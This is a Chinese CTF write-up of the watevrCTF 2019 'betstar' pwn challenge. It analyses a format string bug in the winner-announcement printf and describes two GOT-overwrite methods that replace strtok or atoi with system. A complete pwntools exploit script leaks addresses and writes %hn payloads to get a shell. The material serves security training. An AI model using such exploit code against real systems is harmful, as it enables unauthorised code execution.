---
title: nightmare 3.4.watevrctf2019-betstar-wp
date: 2023-08-25 21:42:26
tags:
- CTF
- pwn
- fmt_str
- stack 
- got  
- watevrctf2019
- nightmare
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings/watevrctf19_betstar)  

## 文件分析

```sh
$ checksec betstar
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 代码分析

```c
puts("Welcome to the ultimate betting service.");
printf("%s", "Enter the amount of players: ");
fgets(s, 3, stdin);
num = atoi(s);
players = (person *)malloc(8 * (num + 6));
for (i = 0; i < num; ++i) {		// 创建num个玩家
    v4 = &players[i];
    v4->name = (char *)malloc(4u);
    printf("%s", "Name: ");
    fgets(players[i].name, 10, stdin);
    strtok(players[i].name, "\n");
}
// [...]
switch (option) {
case 1:		// 进行一局猜数
    play_round(players);	
    fflush(stdout);
    break;
case 2:		//展示各玩家得分
    show_score(players, num);	
    break;
case 3:		// 增添玩家
    if (v9 == 6) {
        puts("Ughh, stop it. I already added enought players for you. Stop "
             "bothering me");
    } else {
        puts("Welcome new player!");
        printf("%s", "Please enter your name: ");
        v5 = &players[num];
        v5->name = (char *)malloc(4u);
        fgets(players[num].name, 20, stdin);
        strtok(players[num++].name, "\n");
        ++v9;
    }
    break;
case 4:		// 更改玩家名
    puts("Which player index should i change: ");
    fgets(nptr, 5, stdin);
    v14 = atoi(nptr);
    if (v14 >= 0 && v14 <= num) {
        printf("Enter new name: ");
        fgets(players[v14].name, 18, stdin);
        strtok(players[v14].name, "\n");
    }
    break;
// [...]
}
```

### play_round函数

```c
printf("%s", "Amount of players playing this round: ");
fgets(s, 5, stdin);		// 指定前n个玩家参与游戏
v6 = atoi(s);
puts("Each player makes a bet between 0 -> 100, the one who lands closest win "
     "the round!");
v8 = rand() % 100 + 1;
v3 = -1;
v4 = 100;
for (i = 0; i < v6; ++i) {	
    printf("%s", players[i].name);
    printf("'s bet: ");
    v1 = fgets(v10, 5, stdin);
    v7 = atoi(v1);
    if (v4 > (int)abs32(v8 - v7)) {
        v3 = i;
        v4 = v7;
        strcpy(dest, players[i].name);	// 猜数离生成的随机数最近的玩家胜出，名存于dest
    }
}
printf("%s", "And the winner is *drumroll*: ");
printf(dest);	// *********此处存在格式化字符串漏洞*********
++players[v3].score;
```

## 攻击方法

### 法一

1. 创建多名玩家，构造首位玩家名进行游戏泄露地址
2. 准备将`system`真实地址写入到`strtok@got`中，这样覆盖之后再有调用处理输入`/bin/sh`即可获取shell
3. 由于`system`真实地址和`strtok`真实地址都是`0x7f`开头的，所以只需要覆盖最低三个字节（通过`%hhn`写入单字节，`%hn`写入双字节）
4. 拆分`system`地址的每个byte并计算相隔差距
5. 改名，此处要注意不能直接改相邻玩家，因为输入超过了分配的内存空间，会造成后面的被覆盖，所以可以改玩家0，2，4的名称
6. 多名玩家一起多进行几把猜数游戏，前面构造的三个玩家在某次胜利后就会写入目标地址（注意一定要都改完名再进行游戏，如果改一个进行一次可能导致strtok地址不可用，程序崩溃）

### 法二

1. 此处更改`atoi`真实地址
2. 同样计算偏移量，构造格式化字符串（写入两次双字节）
3. 这次直接将字符串拆成两部分分别改玩家0和玩家1，改玩家1的时候覆盖玩家0名字末尾的终止符，成为一个字符串
4. 只要玩家0玩一次即可

## exp

```python
from pwn import *
from ctypes import *
import sys

pty = process.PTY
context(os='linux', arch='i386', log_level='debug')

mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]

proc = process("./betstar", stdin=pty, stdout=pty)
belf = ELF("./betstar")
libc = ELF("./libc-2.27.so")

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

def play_round(num):
    sla(b'End the game', b'1')
    sla(b'Amount', str(num).encode())
    # ts = []
    for i in range(num):
        t = randint(1, 100)
        sla(b'bet:', str(t).encode())
        # ts.append(t)
    # info(ts)

def change_name(idx, name):
    sla(b'End the game', b'4')
    sla(b'change: ', str(idx).encode())
    sla(b'name: ', name)

def add_player(name):
    sla(b'End the game', b'3')
    sla(b'name: ', name)

def get_offset(bt):
    return (bt - 4 + 0x100) % 0x100		# 可能被减为负，需要加上然后区域

gscript = '''
    pie b 0x000009DF
    pie b 0x00000D71
    pie b 0x00000E47
    pie b 0x000009A7
'''

if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

sla(b'amount', b'6')
for i in range(6):
    sla(b'Name:', b'%1$p%23$p')

  
play_round(1)		# 只第一名玩家玩，泄露ELF和libc基地址（由gdb调试分析得来1$p和23$p）
ru(b'*drumroll*: ')
belf_base = int(ru(b'05c'), 16) - 0x105c
libc_base = int(ru(b'\n').strip(b'\n'), 16) - 0x10 -libc.sym['atoi']
strtok = libc_base + libc.sym['strtok']
strtok_got = belf_base + belf.got['strtok']
atoi_got = belf_base + belf.got['atoi']
system = libc_base + libc.sym['system']

success("elf base: " + hex(belf_base))
success("libc base: " + hex(libc_base))
success("strtok: " + hex(strtok))
success("strtok@got: " + hex(strtok_got))
success("system: " + hex(system))

byte0 = (system & 0xff)
byte1 = ((system >> 8) & 0xff)
byte2 = ((system >> 16) & 0xff)
word1 = ((system >> 8) & 0xffff)    # byte 1 and 2

# # method 1
# change_name(0, p32(strtok_got + 0) + f'%{get_offset(byte0)}d%19$hhn'.encode())
# info("player0: "+ f'%{get_offset(byte0)}d%19$hhn')
# change_name(2, p32(strtok_got + 1) + f'%{get_offset(byte1)}d%19$hhn'.encode())
# info("player1: "+ f'%{get_offset(byte1)}d%19$hhn')
# change_name(4, p32(strtok_got + 2) + f'%{get_offset(byte2)}d%19$hhn'.encode())
# info("player2: "+ f'%{get_offset(byte2)}d%19$hhn')
# for i in range(30):
#     play_round(6)
# add_player(b'/bin/sh\x00')


# method 2
fmt = p32(atoi_got) + p32(atoi_got + 2)
fmt += f'%{(system & 0xffff) - 8}d%19$hn'.encode()
fmt += f'%{((system >> 16) & 0xffff) - (system & 0xffff)}d%20$hn'.encode()
print(len(fmt))
change_name(0, fmt[0:17])
change_name(1, fmt[16:])
play_round(1)
sla(b'End the game', b'sh')



pi()
pause()
```

